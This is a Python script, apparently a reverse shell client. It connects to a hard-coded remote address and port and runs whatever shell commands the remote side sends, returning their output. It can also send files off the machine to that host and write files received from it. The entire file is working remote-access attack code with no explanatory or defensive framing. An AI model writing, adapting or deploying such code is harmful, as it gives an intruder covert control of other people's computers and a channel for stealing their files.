import socket
import os
import subprocess
import shlex
import time
def download_file(file_name, sock):
    sock.send(('download '+file_name).encode())
    os.system('type nul >> '+file_name)
    with open(file_name, "wb") as file:
        chunk = sock.recv(1024)
        while chunk != b'done':
            file.write(chunk)
            chunk = sock.recv(1024)
        else:
            print("done!")
        file.close()

def upload_file(file_name, sock):
    try:
        with open(file_name, "rb") as file:
            for line in file:
                print(line)
                sock.send(line)
            time.sleep(1)
            file.close()
            sock.send("done".encode())
    except:
        sock.send("no such file".encode())
sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

sock.connect(("10.23.12.107", 7756))
cmd = ""
while True:
    try:
         if cmd != "EXIT":
            if cmd[0:2] == 'cd':
                 os.chdir(cmd[3:])
                 cmd = sock.recv(1024).decode()
            if cmd[0:8] == "download":
                upload_file(cmd[9:], sock)
                cmd = sock.recv(1024).decode()
            if cmd[0:6] == "upload":
                download_file(cmd[7:], sock)
                cmd = sock.recv(1024).decode()
            else:
                args = shlex.split(cmd)
                execute = subprocess.Popen(args, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE,
                                           stdin=subprocess.PIPE)
                result = execute.stdout.read() + execute.stderr.read()
                sock.send(result)
                cmd = sock.recv(1024).decode()
         else:
            print("bye!")
            sock.close()
            break
    except:
        sock.send("error".encode())
        cmd = sock.recv(1024).decode()

sock.close()
